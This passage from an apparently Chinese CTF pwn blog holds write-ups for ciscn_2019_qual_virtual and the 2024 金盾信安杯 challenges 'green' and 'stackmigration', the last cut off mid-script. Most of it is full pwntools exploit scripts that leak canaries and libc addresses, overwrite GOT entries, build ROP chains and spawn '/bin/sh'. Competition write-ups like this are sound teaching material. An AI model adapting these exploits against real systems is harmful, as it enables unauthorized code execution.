operator">+</span> a2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//copy(data_addr,*(data+idx+a2))</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data里取出一个值a2作为下标，并将该下标对应的值放入data中</p></li><li><p>save</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>data_addr <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token comment">//*(data+idx+v2)=v3</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data里取出值v2作为下标和v3作为值，将v3赋值给v2下标对应的值</p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>通过上面的分析，我们找到了两个漏洞，对堆的任意地址的读写漏洞。但是不好泄露地址怎么办，其实不需要泄露<br>，利用好给出的加减指令</p><ol><li><p>劫持 data 到一块空内存<br>劫持到bss上。<br>因为idx&#x3D;-1，所以偏移要加回去</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push push save0x404650 -4+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>把 puts 真实地址读到该内存区域<br>算一下 puts_got 和劫持完成之后的 data 的偏移为 0xe0</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push load-1c+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取 system 真实地址<br>计算 system 和 puts 的偏移，放到 data 上</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push add-0x2a300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>把 data 里的 system 地址赋值给 puts_got</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">push save-1c+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>save：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push push save'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x0000000000401D98\n')</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>load：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push load'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x00000000004014A0\n')</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EXP</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push push save push load push add push save'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x0000000000401D98\n')</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x00000000004014A0\n'</span><span class="token punctuation">)</span>puts_got<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x404100</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x2a300</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h","-l 150"]</span>binary<span class="token operator">=</span><span class="token string">'./ciscn_2019_qual_virtual'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届金盾信安杯初赛2024</title>
      <link href="/2024/12/01/%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B2024/"/>
      <url>/2024/12/01/%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B2024/</url>
      
        <content type="html"><![CDATA[<h1 id="green"><a href="#green" class="headerlink" title="green"></a>green</h1><p>直接两个裸溢出，格式化字符串泄露canary和libc，然后直接走rop即可<br><img src="/EXP_FILE/8a89141e28cf39459be2df0feb35a2e0_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#dbg('b *$rebase(0x0000132A)')</span>sla<span class="token punctuation">(</span><span class="token string">'Every protection is enabled. Good luck.'</span><span class="token punctuation">,</span><span class="token string">b'%15$p.%16$p'</span><span class="token punctuation">)</span><span class="token comment">#本地</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>canary<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>stdout<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>stdout<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x00001363)'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>system<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>binsh<span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./green'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="stackmigration"><a href="#stackmigration" class="headerlink" title="stackmigration"></a>stackmigration</h1><p>溢出了0x10字节，栈劫持到bss上走rop泄露libc，然后再劫持一次走system</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Give you a gift:0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>read_leave_ret<span class="token operator">=</span><span class="token number">0x000000000040087F</span>leave_ret<span class="token operator">=</span><span class="token 